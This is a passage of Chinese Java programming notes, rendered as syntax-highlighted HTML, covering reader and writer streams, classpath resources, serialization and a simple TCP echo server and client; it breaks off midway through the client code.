&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上述代码实际上就是&lt;code>FileReader&lt;/code>的一种实现方式。&lt;/p>
&lt;p>使用&lt;code>try (resource)&lt;/code>结构时，当我们关闭&lt;code>Reader&lt;/code>时，它会在内部自动调用&lt;code>InputStream&lt;/code>的&lt;code>close()&lt;/code>方法，所以，只需要关闭最外层的&lt;code>Reader&lt;/code>对象即可&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">OutputStream&lt;/th>
&lt;th style="text-align:left">Writer&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">字节流，以&lt;code>byte&lt;/code>为单位&lt;/td>
&lt;td style="text-align:left">字符流，以&lt;code>char&lt;/code>为单位&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">写入字节（0~255）：&lt;code>void write(int b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">写入字符（0~65535）：&lt;code>void write(int c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">写入字节数组：&lt;code>void write(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">写入字符数组：&lt;code>void write(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">无对应方法&lt;/td>
&lt;td style="text-align:left">写入String：&lt;code>void write(String s)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>除了&lt;code>CharArrayWriter&lt;/code>和&lt;code>StringWriter&lt;/code>外，普通的Writer实际上是基于&lt;code>OutputStream&lt;/code>构造的，它接收&lt;code>char&lt;/code>，然后在内部自动转换成一个或多个&lt;code>byte&lt;/code>，并写入&lt;code>OutputStream&lt;/code>。因此，&lt;code>OutputStreamWriter&lt;/code>就是一个将任意的&lt;code>OutputStream&lt;/code>转换为&lt;code>Writer&lt;/code>的转换器：&lt;/p>
&lt;pre tabindex="0">&lt;code>try (Writer writer = new OutputStreamWriter(new FileOutputStream(&amp;#34;readme.txt&amp;#34;), &amp;#34;UTF-8&amp;#34;)) {
// TODO:
}
&lt;/code>&lt;/pre>&lt;p>上述代码实际上就是&lt;code>FileWriter&lt;/code>的一种实现方式，这和上面的&lt;code>InputStreamReader&lt;/code>是一样的&lt;/p>
&lt;h3 id="filter模式">Filter模式&lt;/h3>
&lt;p>Filter模式可以在运行期动态增加功能，又称Decorator模式&lt;/p>
&lt;h3 id="classpath">classpath&lt;/h3>
&lt;p>从classpath读取文件就可以避免不同环境下文件路径不一致的问题，在classpath中的资源文件，路径总是以&lt;code>／&lt;/code>开头，我们先获取当前的&lt;code>Class&lt;/code>对象，然后调用&lt;code>getResourceAsStream()&lt;/code>就可以直接从classpath读取任意的资源文件：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用&lt;code>getResourceAsStream()&lt;/code>需要特别注意的一点是，如果资源文件不存在，它将返回&lt;code>null&lt;/code>。因此，我们需要检查返回的&lt;code>InputStream&lt;/code>是否为&lt;code>null&lt;/code>，如果为&lt;code>null&lt;/code>，表示资源文件在classpath中没有找到：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果我们把默认的配置放到jar包中，再从外部文件系统读取一个可选的配置文件，就可以做到既有默认的配置文件，又可以让用户自己修改配置：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#111">props&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Properties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./conf.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样读取配置文件，应用程序启动就更加灵活&lt;/p>
&lt;h3 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h3>
&lt;p>序列化是指把一个Java对象变成二进制内容，本质上就是一个&lt;code>byte[]&lt;/code>数组&lt;/p>
&lt;p>一个Java对象要能序列化，必须实现一个特殊的&lt;code>java.io.Serializable&lt;/code>接口(标记接口Marker Interface)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行（同PHP），可设置&lt;code>serialVersionUID&lt;/code>作为版本号&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">2709425275741743919L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以避免class定义变动导致的不兼容，通常可以由IDE自动生成&lt;/p>
&lt;h2 id="网络编程">网络编程&lt;/h2>
&lt;h3 id="socket---tcp">Socket - TCP&lt;/h3>
&lt;p>一个Socket就是由ip和port构成，Socket编程就是指两个进程之间的网络通信，Server&amp;amp;Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Server.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.ServerSocket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.Socket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.charset.StandardCharsets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServerSocket&lt;/span> &lt;span style="color:#111">ss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ServerSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6980&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Server is running...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ss&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected from &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRemoteSocketAddress&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">ioe&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Client disconnected&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye~\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Socket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 连接指定服务器和端口
